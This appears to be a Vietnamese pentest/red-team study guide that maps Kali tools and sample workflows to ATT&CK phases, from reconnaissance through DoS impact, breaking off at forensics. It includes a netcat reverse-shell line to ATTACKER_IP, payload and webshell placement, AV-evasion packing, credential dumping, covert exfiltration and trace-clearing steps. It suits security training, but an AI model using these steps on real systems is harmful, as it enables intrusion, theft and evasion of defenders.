01 -- Reconnaissance (trinh sát/thu thập thông tin ban đầu)

-   Reconnaissance là bước đầu của quy trình pentest/red team: gom càng
    nhiều dữ liệu công khai/ít gây chú ý càng tốt để hiểu "bề mặt tấn
    công" của mục tiêu trước khi quét sâu hay khai thác.

-   Có 2 kiểu chính:

```{=html}
<!-- -->
```
-   Passive recon: không/ít chạm vào hạ tầng mục tiêu (OSINT, search
    engines, DNS công khai...). Ít gây log/ít ồn.

-   Active recon: gửi truy vấn trực tiếp tới tài sản mục tiêu (DNS
    brute-force, HTTP fingerprinting...). Nhanh, giàu dữ liệu hơn nhưng
    dễ bị phát hiện\|

```{=html}
<!-- -->
```
-   Phân chia theo nhóm:

```{=html}
<!-- -->
```
-   Nhóm thu thập OSINT & liệt kê subdomain: theHarvester, Amass,
    Sublist3r, SpiderFoot, Maltego CE, Recon-NG

-   Nhóm DNS & hạ tầng: DNSrecon, DNSenum, Fierce

-   Nhóm fingerprinting & biên phòng: WhatWeb, WAFW00F

-   Nhóm nội dung tài liệu & typosquatting: Metagoofil, urlcrayzy

```{=html}
<!-- -->
```
-   Quy trình mẫu

```{=html}
<!-- -->
```
-   Xác định phạm vi (domain chính, công ty mẹ, ASN, dải IP công khai).

-   Passive subdomain + email:

```{=html}
<!-- -->
```
-   amass enum -passive -d example.com -o amass.txt

-   theHarvester -d example.com -b all -l 200 -f harvest.html

-   sublist3r -d example.com -o s3.txt

```{=html}
<!-- -->
```
-   Hợp nhất & resolve (lọc hợp lệ):

```{=html}
<!-- -->
```
-   cat amass.txt s3.txt \| sort -u \> subs_raw.txt

-   dnsrecon -d example.com -D subs_raw.txt -t brt -c dnsrecon.csv

```{=html}
<!-- -->
```
-   DNS & hạ tầng: thử dnsrecon -d example.com -t axfr (nhiều nơi chặn),
    dnsenum \--enum example.com.

-   Fingerprint web:

```{=html}
<!-- -->
```
-   whatweb -a 3 -v <https://sub.example.com>

-   wafw00f <https://sub.example.com> (để biết có WAF → chỉnh chiến
    thuật).

```{=html}
<!-- -->
```
-   Metadata & typosquatting:

```{=html}
<!-- -->
```
-   metagoofil \... để lộ user nội bộ/phần mềm.

-   urlcrazy \... để rà domain dễ gây nhầm (hữu ích cho đánh giá rủi ro
    thương hiệu/phishing).

```{=html}
<!-- -->
```
-   Tổng hợp & ưu tiên mục tiêu:

```{=html}
<!-- -->
```
-   subdomain có cổng 80/443 mở, công nghệ lỗi thời, không có WAF → đưa
    vào danh sách kiểm thử sâu.

02 -- Resource Development (chuẩn bị tài nguyên)

-   Resource Development là giai đoạn tự chuẩn bị hoặc tùy biến công
    cụ/tài nguyên trước khi tấn công, bao gồm:

```{=html}
<!-- -->
```
-   Danh sách từ khóa (wordlists) để brute-force, fuzzing, password
    cracking.

-   Payload / Shellcode / Webshell để khai thác lỗ hổng.

-   Công cụ hỗ trợ sinh dữ liệu phục vụ social engineering, password
    spraying, phishing...

```{=html}
<!-- -->
```
-   Phân chia theo nhóm:

```{=html}
<!-- -->
```
-   Wordlists & Tạo Wordlists: Seclists, CeWL, Crunch, CUPP,
    maskprocessor, wordlists (rockyou, fasttrack,...)

-   Payload & Backdoor: msfvenom (tạo payload), MSSFPC(msfpc), Laudanum
    (bộ web-shell mẫu)

```{=html}
<!-- -->
```
-   Quy trình mẫu khi chuẩn bị tài nguyên

```{=html}
<!-- -->
```
-   Xác định mục tiêu → thu thập thông tin (tên công ty, nhân viên, công
    nghệ dùng).

```{=html}
<!-- -->
```
-   Sinh wordlist tùy chỉnh:

```{=html}
<!-- -->
```
-   CeWL lấy keyword từ site công ty.

-   CUPP tạo passlist từ thông tin cá nhân.

```{=html}
<!-- -->
```
-   Kết hợp & lọc wordlist:

```{=html}
<!-- -->
```
-   Trộn rockyou.txt + wordlist tùy chỉnh → dùng sort -u.

```{=html}
<!-- -->
```
-   Chuẩn bị payload:

```{=html}
<!-- -->
```
-   msfvenom hoặc MSSFPC tạo shellcode/backdoor theo OS mục tiêu.

```{=html}
<!-- -->
```
-   Chuẩn bị webshell:

```{=html}
<!-- -->
```
-   Tùy ngôn ngữ máy chủ (PHP/ASP/JSP) → lấy từ Laudanum.

```{=html}
<!-- -->
```
-   Tổ chức kho tài nguyên:

```{=html}
<!-- -->
```
-   /wordlists (mật khẩu, username)

-   /payloads (shellcode, backdoor)

-   /webshells (PHP/ASP/JSP)

03 -- Initial Access (xâm nhập ban đầu)

-   Initial Access là giai đoạn bạn tìm cách đặt chân vào hệ thống lần
    đầu tiên sau khi đã trinh sát và chuẩn bị tài nguyên.

-   Cách tiếp cận phổ biến:

```{=html}
<!-- -->
```
-   Khai thác lỗ hổng (web/app/service).

-   Tấn công kỹ thuật xã hội (phishing, giả mạo).

-   Khai thác cấu hình yếu (CMS, router, IoT).

-   Injection attacks (SQLi, command injection, XSS...).

```{=html}
<!-- -->
```
-   Phân chia theo nhóm:

```{=html}
<!-- -->
```
-   Khung khai thác đa năng:

```{=html}
<!-- -->
```
-   Metasploit Framework, BeEF , Social-Engineer Toolkit (SET)

```{=html}
<!-- -->
```
-   Khai thác lỗ hổng Web:

```{=html}
<!-- -->
```
-   SQLMap , Commix , WPScan , xsser

```{=html}
<!-- -->
```
-   Khai thác thiết bị mạng / IoT:

```{=html}
<!-- -->
```
-   RouterSploit

```{=html}
<!-- -->
```
-   Quy trình mẫu Initial Access

```{=html}
<!-- -->
```
-   Xác định bề mặt tấn công

```{=html}
<!-- -->
```
-   Nếu là web: kiểm tra SQLi (sqlmap), XSS (xsser), command injection
    (commix).

-   Nếu là WordPress: dùng wpscan.

-   Nếu là router/IoT: thử routersploit.

```{=html}
<!-- -->
```
-   Khai thác

```{=html}
<!-- -->
```
-   Chạy exploit qua Metasploit hoặc script riêng.

-   Với client-side: dùng BeEF hoặc SET để nhử nạn nhân.

```{=html}
<!-- -->
```
-   Tạo & gửi payload

```{=html}
<!-- -->
```
-   Tạo payload với msfvenom hoặc module Metasploit.

-   Chèn payload vào trang giả mạo, email, file.

```{=html}
<!-- -->
```
-   Nhận kết nối (handler)

```{=html}
<!-- -->
```
-   Mở listener trong Metasploit (exploit/multi/handler).

-   Chờ reverse shell/meterpreter từ mục tiêu.

```{=html}
<!-- -->
```
-   Xác nhận foothold

```{=html}
<!-- -->
```
-   Khi có shell: kiểm tra quyền, hệ điều hành, và chuẩn bị bước leo
    thang.

04 -- Execution (thực thi payload/lệnh)

-   Execution là giai đoạn sau khi đã có cách xâm nhập ban đầu (Initial
    Access), bạn thực thi mã, payload hoặc lệnh trên hệ thống mục tiêu
    để:

```{=html}
<!-- -->
```
-   Mở kết nối từ nạn nhân về máy tấn công (reverse shell).

-   Duy trì kết nối shell tương tác.

-   Chuyển file hoặc relay kết nối.

```{=html}
<!-- -->
```
-   Phân chia theo nhóm:

```{=html}
<!-- -->
```
-   Kết nối mạng & shell:

```{=html}
<!-- -->
```
-   ncat, socat, Netcat-traditional

```{=html}
<!-- -->
```
-   Ngôn ngữ scripting trên mục tiêu:

```{=html}
<!-- -->
```
-   PowerShell (pwsh), Python (simple http/server & exec)

```{=html}
<!-- -->
```
-   Tối ưu và nâng cấp shell:

```{=html}
<!-- -->
```
-   socat-relay, rlwrap (bọc shell), Bash reverse-shell helpers,

```{=html}
<!-- -->
```
-   Quy trình mẫu khi Execution

```{=html}
<!-- -->
```
-   Listener trên máy tấn công:

```{=html}
<!-- -->
```
-   ncat -lvnp 4444 hoặc socat TCP-LISTEN:4444,reuseaddr,fork
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane.

```{=html}
<!-- -->
```
-   Trigger payload trên mục tiêu:

```{=html}
<!-- -->
```
-   Netcat: nc -e /bin/bash ATTACKER_IP 4444

-   Python: reverse shell one-liner

-   PowerShell: tải & chạy script

```{=html}
<!-- -->
```
-   Nâng cấp shell:

```{=html}
<!-- -->
```
-   Dùng python3 -c \'import pty; pty.spawn(\"/bin/bash\")\' để có TTY

-   Dùng rlwrap từ đầu hoặc stty raw -echo; fg để cải thiện trải nghiệm

```{=html}
<!-- -->
```
-   Relay / Pivot nếu cần\*\*:

```{=html}
<!-- -->
```
-   socat hoặc SSH dynamic port forwarding

05 -- Persistence (duy trì hiện diện)

-   Persistence là giai đoạn sau khi đã xâm nhập thành công (Initial
    Access + Execution) bạn tạo hoặc giữ một "cửa hậu" để:

```{=html}
<!-- -->
```
-   Có thể quay lại hệ thống bất kỳ lúc nào, ngay cả khi phiên hiện tại
    bị mất.

-   Không cần khai thác lại từ đầu.

-   Giảm rủi ro bị chặn nếu chỉ có một vector truy cập.

```{=html}
<!-- -->
```
-   Persistence thường bao gồm:

```{=html}
<!-- -->
```
-   Webshell (cho web server).

-   Tài khoản/khóa SSH bí mật.

-   Tunneling / Pivoting để giữ đường vào qua máy trung gian.

-   Remote Management Tool cho Windows/Linux.

```{=html}
<!-- -->
```
-   Phân chia theo nhóm:

```{=html}
<!-- -->
```
-   Webshell (giữ quyền trên web server)

```{=html}
<!-- -->
```
-   Weevely(web-shell), Laudanum(web-shell)

```{=html}
<!-- -->
```
-   Điểm bám vào hệ thống

```{=html}
<!-- -->
```
-   Evil-WinRM (điểm bám Windows), SSH authorized_keys helpers

```{=html}
<!-- -->
```
-   Tunneling / Pivoting (giữ đường vào ẩn):

```{=html}
<!-- -->
```
-   Chisel (giữ đường vào qua tunnel), reGeorg/Neo-reGeorg (HTTP pivot)

```{=html}
<!-- -->
```
-   Quy trình mẫu Persistence

```{=html}
<!-- -->
```
-   Chèn điểm truy cập bí mật

```{=html}
<!-- -->
```
-   Web: upload Weevely / Laudanum.

-   Windows: tạo user admin ẩn hoặc dùng Evil-WinRM với hash/password đã
    có.

-   Linux: thêm SSH key.

```{=html}
<!-- -->
```
-   Tạo đường quay lại

```{=html}
<!-- -->
```
-   Dùng Chisel hoặc Neo-reGeorg để tạo tunnel ẩn.

-   Lưu sẵn lệnh kết nối để tái sử dụng.

```{=html}
<!-- -->
```
-   Ẩn dấu vết & ngụy trang

```{=html}
<!-- -->
```
-   Đặt webshell ở thư mục không gây chú ý (ảnh, backup).

-   Đổi tên file/command cho khó phát hiện.

```{=html}
<!-- -->
```
-   Kiểm tra định kỳ

```{=html}
<!-- -->
```
-   Đảm bảo điểm persistence hoạt động (cron job hoặc task scheduler
    test).

06 -- Privilege Escalation (leo thang đặc quyền)

-   Privilege Escalation là giai đoạn bạn đã có foothold (truy cập ban
    đầu) nhưng quyền hạn thấp (ví dụ: user thường), và mục tiêu là lên
    quyền cao hơn (root trên Linux, SYSTEM trên Windows).

-   Có 2 loại chính:

```{=html}
<!-- -->
```
-   Vertical escalation -- Từ user thấp → root/SYSTEM.

-   Horizontal escalation -- Truy cập từ một user → tài khoản user khác
    có quyền hơn.

```{=html}
<!-- -->
```
-   Kỹ thuật:

```{=html}
<!-- -->
```
-   Khai thác lỗ hổng kernel, SUID/SGID binary, dịch vụ sai cấu hình.

-   Lợi dụng mật khẩu lưu sai chỗ, file config, task scheduler, sudo
    misconfig.

-   Abuse binary có thể \"escape\" sang shell (GTFOBins).

```{=html}
<!-- -->
```
-   Phân chia theo nhóm:

```{=html}
<!-- -->
```
-   Enumeration & Suggestion Tool:

```{=html}
<!-- -->
```
-   linux-exploit-suggester, unix-privesc-check, BeRoot (Windows), lse
    (Linux Smart Enum nếu đã cài), LinEnum

```{=html}
<!-- -->
```
-   Exploit helper:

```{=html}
<!-- -->
```
-   GTFOBins helper/gtfoblookup, kernel-exploit collections.

```{=html}
<!-- -->
```
-   Quy trình mẫu Privilege Escalation

```{=html}
<!-- -->
```
-   Enumeration (thu thập thông tin)

```{=html}
<!-- -->
```
-   Linux: LinEnum, lse, linux-exploit-suggester

-   Windows: BeRoot, manual checks (whoami /priv, systeminfo)

```{=html}
<!-- -->
```
-   Tìm vector leo quyền

```{=html}
<!-- -->
```
-   File SUID/SGID → GTFOBins.

-   Sudo rule → chạy binary đặc biệt (sudo -l).

-   Cron job có quyền root nhưng writable.

-   Kernel cũ → kernel exploit.

```{=html}
<!-- -->
```
-   Khai thác

```{=html}
<!-- -->
```
-   Tải và chạy exploit tương ứng.

-   Dùng GTFOBins để spawn shell root.

```{=html}
<!-- -->
```
-   Xác nhận & ổn định

```{=html}
<!-- -->
```
-   whoami → root hoặc NT AUTHORITY\\SYSTEM.

-   Tạo điểm persistence root (SSH key, backdoor).

07 -- Defense Evasion (né phát hiện/che giấu)

-   Defense Evasion là giai đoạn bạn né tránh hoặc vượt qua hệ thống
    phòng thủ như antivirus (AV), endpoint detection & response (EDR),
    firewall, sandbox...

-   Mục tiêu:

```{=html}
<!-- -->
```
-   Giúp payload/backdoor chạy mà không bị phát hiện hoặc chặn.

-   Giảm "dấu vết" để kéo dài thời gian tồn tại trong hệ thống.

-   Ngụy trang mã độc thành file/trình hợp pháp hoặc mã hóa payload.

```{=html}
<!-- -->
```
-   Các kỹ thuật phổ biến:

```{=html}
<!-- -->
```
-   Packing (nén và mã hóa nhị phân).

-   Encoding (mã hóa shellcode, thay đổi chữ ký).

-   Obfuscation (làm rối code/script).

-   Fileless execution (payload chạy trực tiếp trong memory).

```{=html}
<!-- -->
```
-   Phân chia theo nhóm:

```{=html}
<!-- -->
```
-   Payload generation + AV evasion:

```{=html}
<!-- -->
```
-   Veil-Evasion, Shellter, The Backdoor Factory, DKMC (Don\'t Kill My
    Cat)

```{=html}
<!-- -->
```
-   Packing / Compression:

```{=html}
<!-- -->
```
-   UPX (Ultimate Packer for eXecutables)

```{=html}
<!-- -->
```
-   Encoding / Script obfuscation:

```{=html}
<!-- -->
```
-   msfvenom encoders, sRDI (DLL→shellcode), Obfuscation scripts (donut,
    unicorn)

```{=html}
<!-- -->
```
-   Quy trình Defense Evasion:

```{=html}
<!-- -->
```
-   Chuẩn bị payload (msfvenom / custom binary).

-   Obfuscate/Encode:

```{=html}
<!-- -->
```
-   Dùng msfvenom -e, Veil-Evasion, hoặc donut/unicorn cho script.

```{=html}
<!-- -->
```
-   Pack hoặc Inject:

```{=html}
<!-- -->
```
-   UPX → nén binary.

-   Shellter/BDF → chèn vào file hợp pháp.

```{=html}
<!-- -->
```
-   Ngụy trang:

```{=html}
<!-- -->
```
-   Đặt tên và icon giống phần mềm hợp pháp.

-   DKMC → giấu payload trong hình ảnh.

```{=html}
<!-- -->
```
-   Triển khai:

```{=html}
<!-- -->
```
-   Gửi qua phishing, tải từ web, hoặc chạy từ foothold đã có.

08 -- Credential Access (thu/bẻ mật khẩu)

-   Credential Access là giai đoạn thu thập thông tin xác thực
    (user/pass, hash, ticket...) từ hệ thống hoặc bẻ các thông tin đó để
    dùng cho lateral movement hay privilege escalation.

```{=html}
<!-- -->
```
-   Các nguồn lấy credentials:

```{=html}
<!-- -->
```
-   Bộ nhớ (RAM) -- lấy plaintext pass, hash, ticket.

-   File / Config -- mật khẩu lưu trong script, config, registry.

-   Network sniffing -- bắt gói chứa hash/NTLM.

-   Brute-force / Password spraying -- đoán hoặc thử pass từ danh sách.

-   Offline cracking -- bẻ hash dump được.

```{=html}
<!-- -->
```
-   Phân chia theo nhóm:

```{=html}
<!-- -->
```
-   Trích xuất / dump credentials:

```{=html}
<!-- -->
```
-   Mimikatz, Impacket (secretsdump.py, GetNPUsers.py, GetUserSPNs.py),
    > LaZagne, gpp-decrypt, reddump7

```{=html}
<!-- -->
```
-   Crack mật khẩu / hash:

```{=html}
<!-- -->
```
-   Hashcat, John the Ripper, hashid.

```{=html}
<!-- -->
```
-   Brute-force online:

```{=html}
<!-- -->
```
-   Kerbrute, Hashcat, Hydra, Medusa, Ncrack

```{=html}
<!-- -->
```
-   Quy trình mẫu Credential Access:

```{=html}
<!-- -->
```
-   Dump hash / ticket / plaintext

```{=html}
<!-- -->
```
-   Windows: mimikatz, secretsdump.py, LaZagne.

-   Linux: đọc /etc/shadow, keychain, file config.

```{=html}
<!-- -->
```
-   Xác định loại hash

```{=html}
<!-- -->
```
-   Dùng hashid hoặc hashcat \--example-hashes.

```{=html}
<!-- -->
```
-   Offline cracking

```{=html}
<!-- -->
```
-   hashcat (GPU) hoặc john (CPU) với wordlist như rockyou.txt.

```{=html}
<!-- -->
```
-   Tấn công Kerberos

```{=html}
<!-- -->
```
-   AS-REP roasting → GetNPUsers.py.

-   Kerberoasting → GetUserSPNs.py.

```{=html}
<!-- -->
```
-   Brute-force online

```{=html}
<!-- -->
```
-   SSH/FTP → hydra, medusa, ncrack.

-   AD user enum → kerbrute.

```{=html}
<!-- -->
```
-   Thu pass từ ứng dụng

```{=html}
<!-- -->
```
-   Dùng LaZagne trên máy nạn nhân hoặc đọc config thủ công.

09 -- Discovery (khám phá nội bộ)

-   Discovery là giai đoạn tìm hiểu hạ tầng nội bộ sau khi đã vào được
    mạng mục tiêu (thường là sau khi có foothold).

-   Mục tiêu:

```{=html}
<!-- -->
```
-   Xác định host, dịch vụ, share, thiết bị mạng.

-   Thu thập thông tin phục vụ lateral movement hoặc khai thác sâu.

-   Hiểu "bản đồ" mạng nội bộ (network mapping).

```{=html}
<!-- -->
```
-   Phân chia theo nhóm:

```{=html}
<!-- -->
```
-   Network scanning:

```{=html}
<!-- -->
```
-   Nmap, Masscan

```{=html}
<!-- -->
```
-   Host discovery:

```{=html}
<!-- -->
```
-   netdiscover, arp-scan, nbtscan/nbtscan-unixwiz

```{=html}
<!-- -->
```
-   SMB & Windows enum:

```{=html}
<!-- -->
```
-   smbmap, enum4linux-ng, smbclient

```{=html}
<!-- -->
```
-   SNMP discovery:

```{=html}
<!-- -->
```
-   snmp-check/snmpwalk

```{=html}
<!-- -->
```
-   VPN & Directory enum:

```{=html}
<!-- -->
```
-   ike-scan, ldapsearch/ldap-utils

```{=html}
<!-- -->
```
-   Quy trình mẫu Discovery (trong mạng nội bộ)

```{=html}
<!-- -->
```
-   Xác định subnet

```{=html}
<!-- -->
```
-   ip a hoặc ifconfig để lấy dải IP.

```{=html}
<!-- -->
```
-   Host discovery

```{=html}
<!-- -->
```
-   netdiscover hoặc arp-scan để liệt kê IP đang online.

```{=html}
<!-- -->
```
-   Port & service scan

```{=html}
<!-- -->
```
-   Quét nhanh: masscan -p80,445 192.168.1.0/24 \--rate 5000.

-   Quét kỹ: nmap -A -p- 192.168.1.10.

```{=html}
<!-- -->
```
-   Liệt kê dịch vụ đặc biệt

```{=html}
<!-- -->
```
-   SMB: smbmap, enum4linux-ng, smbclient.

-   SNMP: snmpwalk, snmp-check.

-   NetBIOS: nbtscan.

-   LDAP: ldapsearch.

-   VPN: ike-scan.

```{=html}
<!-- -->
```
-   Tổng hợp bản đồ mạng

```{=html}
<!-- -->
```
-   Ghi chú host → dịch vụ → phiên bản → khả năng khai thác.

10 -- Lateral Movement (di chuyển ngang)

-   Lateral Movement là giai đoạn bạn đã xâm nhập một máy trong mạng nội
    bộ, sau đó di chuyển sang máy khác để mở rộng quyền kiểm soát.

-   Mục tiêu:

```{=html}
<!-- -->
```
-   Truy cập các hệ thống quan trọng hơn (server, DC).

-   Thu thập thêm credential, dữ liệu, hoặc chuẩn bị privilege
    escalation ở máy mới.

-   Pivot vào subnet khác.

```{=html}
<!-- -->
```
-   Cách phổ biến:

```{=html}
<!-- -->
```
-   Sử dụng credential/hash đã thu được để đăng nhập máy khác.

-   Lợi dụng dịch vụ quản trị từ xa (RDP, WinRM, SMB, WMI, MSSQL...).

-   Dùng tunneling/proxy để truy cập subnet không trực tiếp kết nối.

```{=html}
<!-- -->
```
-   Phân chia theo nhóm:

```{=html}
<!-- -->
```
-   Công cụ đa năng cho Windows & SMB

```{=html}
<!-- -->
```
-   CrackMapExec, Impacket (psexec.py, smbexec.py, wmiexec.py,
    atexec.py, dcomexec.py, mssqlclient.py)

```{=html}
<!-- -->
```
-   Remote Management

```{=html}
<!-- -->
```
-   Evil-WinRM, xfreerdp/rdesktop

```{=html}
<!-- -->
```
-   SSH & Unix

```{=html}
<!-- -->
```
-   Sshpass

```{=html}
<!-- -->
```
-   Pivoting & Spray

```{=html}
<!-- -->
```
-   proxychains4, rdp/rdpspray tools

```{=html}
<!-- -->
```
-   Quy trình mẫu Lateral Movement (trong mạng Windows)

```{=html}
<!-- -->
```
-   Có credential/hash → kiểm tra truy cập máy khác:

```{=html}
<!-- -->
```
-   cme smb \<subnet\> -u user -p pass

-   Hoặc thử hash: cme smb \<subnet\> -u user -H \<NTLM_hash\>

```{=html}
<!-- -->
```
-   Chọn phương thức di chuyển:

```{=html}
<!-- -->
```
-   RDP → xfreerdp (GUI).

-   WinRM → evil-winrm.

-   SMB/WMI → psexec.py / wmiexec.py.

-   MSSQL → mssqlclient.py.

```{=html}
<!-- -->
```
-   Nếu subnet khác không truy cập được trực tiếp → pivot:

```{=html}
<!-- -->
```
-   chisel / proxychains4 → route traffic qua host trung gian.

```{=html}
<!-- -->
```
-   Tránh bị phát hiện:

```{=html}
<!-- -->
```
-   Ưu tiên wmiexec.py hoặc smbexec.py (ít tạo file, stealth hơn
    psexec).

-   Giới hạn số lần đăng nhập để tránh lockout.

11 -- Collection (thu thập dữ liệu)

-   Collection là giai đoạn thu thập thông tin/dữ liệu từ hệ thống hoặc
    mạng mục tiêu sau khi đã có quyền truy cập.

-   Mục tiêu:

```{=html}
<!-- -->
```
-   Lấy dữ liệu nhạy cảm (file, credential, traffic, tài liệu).

-   Phục vụ cho các giai đoạn sau như Exfiltration hoặc Impact.

-   Phân tích nội dung để tìm giá trị (metadata, keyword, password).

```{=html}
<!-- -->
```
-   Phân chia theo nhóm:

```{=html}
<!-- -->
```
-   Network capture

```{=html}
<!-- -->
```
-   Wireshark, tshark/tcpdump, netsniff-ng

```{=html}
<!-- -->
```
-   Metadata & nội dung file

```{=html}
<!-- -->
```
-   exiftool (metadata), catdoc/pdfinfo/strings (trích xuất nội dung).

```{=html}
<!-- -->
```
-   Thu thập & đồng bộ file

```{=html}
<!-- -->
```
-   rclone (đồng bộ thu thập), smbclient/ftp/lftp (kéo file)

```{=html}
<!-- -->
```
-   Quy trình mẫu Collection

```{=html}
<!-- -->
```
-   Xác định nguồn dữ liệu

```{=html}
<!-- -->
```
-   Mạng: bắt traffic → tcpdump, Wireshark.

-   File/document: tìm thư mục quan trọng, file config, share SMB/FTP.

```{=html}
<!-- -->
```
-   Bắt dữ liệu mạng

```{=html}
<!-- -->
```
-   Dùng tcpdump hoặc netsniff-ng để ghi pcap.

-   Phân tích với Wireshark/tshark để tìm password, file transfer.

```{=html}
<!-- -->
```
-   Trích xuất thông tin file

```{=html}
<!-- -->
```
-   exiftool để lấy metadata.

-   strings để tìm pass/URL/API key.

```{=html}
<!-- -->
```
-   Tải và đồng bộ dữ liệu

```{=html}
<!-- -->
```
-   SMB/FTP → smbclient, lftp.

-   Cloud exfiltration → rclone (nếu được phép).

12 -- Command & Control (C2 / điều khiển)

-   Command & Control (C2) là giai đoạn thiết lập kênh liên lạc từ máy
    nạn nhân về máy tấn công sau khi xâm nhập, để:

```{=html}
<!-- -->
```
-   Gửi lệnh điều khiển từ attacker → victim.

-   Nhận dữ liệu phản hồi.

-   Giữ quyền truy cập lâu dài và ổn định.

```{=html}
<!-- -->
```
-   Kênh C2 có thể:

```{=html}
<!-- -->
```
-   Trực tiếp (TCP/UDP/HTTP/HTTPS).

-   Qua tunnel (SSH, VPN, proxy).

-   Qua kênh ẩn (DNS, ICMP, HTTP beaconing).

```{=html}
<!-- -->
```
-   Các công cụ & mục đích:

```{=html}
<!-- -->
```
-   Listener cơ bản

```{=html}
<!-- -->
```
-   Metasploit multi/handler, ncat listener, socat listener

```{=html}
<!-- -->
```
-   Tunnel & Pivot

```{=html}
<!-- -->
```
-   Chisel, frp (nếu đã cài), ssh reverse-tunnel

```{=html}
<!-- -->
```
-   DNS / giao thức ẩn

```{=html}
<!-- -->
```
-   iodine/dns2tcp, dnscat2

```{=html}
<!-- -->
```
-   Webshell-based pivot

```{=html}
<!-- -->
```
-   reGeorg/Neo-reGeorg

```{=html}
<!-- -->
```
-   Quy trình mẫu C2

```{=html}
<!-- -->
```
-   Chọn kênh C2 phù hợp

```{=html}
<!-- -->
```
-   Mạng mở: TCP reverse shell (ncat, multi/handler).

-   Mạng bị chặn: HTTP/HTTPS beacon, DNS tunnel (dnscat2, iodine).

-   Cần pivot: Chisel, Neo-reGeorg.

```{=html}
<!-- -->
```
-   Thiết lập listener

```{=html}
<!-- -->
```
-   Attacker mở listener (multi/handler, ncat, socat).

```{=html}
<!-- -->
```
-   Triển khai payload

```{=html}
<!-- -->
```
-   Trên victim: payload kết nối ngược về attacker.

```{=html}
<!-- -->
```
-   Duy trì & bảo mật kênh

```{=html}
<!-- -->
```
-   Mã hóa (SSL/TLS, SSH).

-   Chạy ngầm (background), tự khởi động lại (cron, scheduled task).

13 -- Exfiltration (rút dữ liệu)

-   Exfiltration là giai đoạn chuyển dữ liệu từ mạng/hệ thống mục tiêu
    ra ngoài sau khi thu thập, thường là bước trước khi kết thúc chiến
    dịch.

-   Mục tiêu:

```{=html}
<!-- -->
```
-   Lấy dữ liệu cần (tài liệu, database dump, credentials).

-   Vượt qua firewall/DLP/IDS/EDR mà không bị phát hiện.

-   Tối ưu tốc độ + giảm khả năng bị log.

```{=html}
<!-- -->
```
-   Kỹ thuật:

```{=html}
<!-- -->
```
-   Trực tiếp (SCP, rsync, HTTP upload).

-   Ngụy trang (DNS, steganography).

-   Giảm kích thước/dấu hiệu (nén, mã hóa, chia nhỏ).

```{=html}
<!-- -->
```
-   Các công cụ & mục đích

```{=html}
<!-- -->
```
-   Truyền file trực tiếp (TCP/HTTP/SFTP)

```{=html}
<!-- -->
```
-   scp/rsync, curl/wget (batch)

```{=html}
<!-- -->
```
-   Đồng bộ cloud / storage

```{=html}
<!-- -->
```
-   Rclone

```{=html}
<!-- -->
```
-   Tunnel vượt chặn

```{=html}
<!-- -->
```
-   httptunnel, iodine/dns2tcp

```{=html}
<!-- -->
```
-   Nén, chia nhỏ, mã hóa

```{=html}
<!-- -->
```
-   zip/7z (nén/chia nhỏ)

```{=html}
<!-- -->
```
-   Ẩn dữ liệu (Steganography)

```{=html}
<!-- -->
```
-   steghide/outguess (ẩn dữ liệu)

```{=html}
<!-- -->
```
-   Quy trình mẫu Exfiltration

```{=html}
<!-- -->
```
-   Chuẩn bị dữ liệu

```{=html}
<!-- -->
```
-   Lọc dữ liệu cần lấy.

-   Nén + mã hóa (zip/7z) để giảm dung lượng và bảo mật.

```{=html}
<!-- -->
```
-   Chọn kênh truyền

```{=html}
<!-- -->
```
-   Nếu SSH mở: scp hoặc rsync.

-   Nếu bị chặn TCP: HTTP (curl, httptunnel) hoặc DNS (iodine).

-   Nếu muốn lưu trữ tạm: rclone lên cloud.

```{=html}
<!-- -->
```
-   Ngụy trang nếu cần

```{=html}
<!-- -->
```
-   Giấu dữ liệu trong ảnh/âm thanh (steghide, outguess).

```{=html}
<!-- -->
```
-   Kiểm tra & xóa dấu vết

```{=html}
<!-- -->
```
-   Xóa file tạm, clear history (history -c), log transfer.

14 -- Impact (tác động/DoS, gây gián đoạn)

-   Impact là giai đoạn tạo ảnh hưởng trực tiếp lên hệ thống hoặc dịch
    vụ mục tiêu, trong pentest có thể là:

```{=html}
<!-- -->
```
-   DoS (Denial of Service) -- làm dịch vụ không thể truy cập.

-   Disruption -- làm gián đoạn kết nối hoặc chức năng.

-   Data destruction/modification -- thay đổi hoặc xóa dữ liệu (chỉ khi
    được phép).

```{=html}
<!-- -->
```
-   Các công cụ & mục đích

```{=html}
<!-- -->
```
-   HTTP / SSL DoS

```{=html}
<!-- -->
```
-   slowloris, thc-ssl-dos

```{=html}
<!-- -->
```
-   Multi-protocol DoS

```{=html}
<!-- -->
```
-   t50, hping3, nping

```{=html}
<!-- -->
```
-   Wi-Fi disruption

```{=html}
<!-- -->
```
-   MDK4 (Wi-Fi deauth/jam), aireplay-ng (deauth)

```{=html}
<!-- -->
```
-   Network layer attacks

```{=html}
<!-- -->
```
-   yersinia, macof.

```{=html}
<!-- -->
```
-   Quy trình mẫu Impact Testing (DoS)

```{=html}
<!-- -->
```
-   Xác định mục tiêu & phạm vi được phép

```{=html}
<!-- -->
```
-   Dịch vụ web, SSL, Wi-Fi, hoặc network device.

```{=html}
<!-- -->
```
-   Chọn công cụ phù hợp

```{=html}
<!-- -->
```
-   Web app layer → slowloris, thc-ssl-dos.

-   Network layer → t50, hping3.

-   Wi-Fi → MDK4, aireplay-ng.

-   Layer 2 → yersinia, macof.

```{=html}
<!-- -->
```
-   Điều chỉnh cường độ

```{=html}
<!-- -->
```
-   Bắt đầu với tần suất thấp để đo phản ứng.

-   Tăng dần đến ngưỡng chịu tải.

```{=html}
<!-- -->
```
-   Giám sát kết quả

```{=html}
<!-- -->
```
-   Dùng ping, curl, nmap để kiểm tra dịch vụ có phản hồi không.

15 -- Forensics (pháp y số)

-   Forensics là lĩnh vực phân tích dữ liệu từ thiết bị, hệ thống hoặc
    mạng để:

```{=html}
<!-- -->
```
-   Xác định nguyên nhân sự cố (incident response).

-   Thu thập bằng chứng số để phục vụ điều tra pháp lý.

-   Khôi phục dữ liệu bị xóa, ẩn hoặc hư hỏng.

```{=html}
<!-- -->
```
-   Các loại forensics:

```{=html}
<!-- -->
```
-   Disk forensics: phân tích ổ đĩa, partition, filesystem.

-   Memory forensics: phân tích dump RAM.

-   Network forensics: phân tích traffic (pcap).

-   Artifact analysis: phân tích log, metadata, file.

```{=html}
<!-- -->
```
-   Các công cụ & mục đích

```{=html}
<!-- -->
```
-   Phân tích ổ đĩa & hệ thống file

```{=html}
<!-- -->
```
-   Autopsy, SleuthKit/tsk-tools

```{=html}
<!-- -->
```
-   Memory forensics

```{=html}
<!-- -->
```
-   Volatility/Volatility3

```{=html}
<!-- -->
```
-   Trích xuất & phân tích dữ liệu

```{=html}
<!-- -->
```
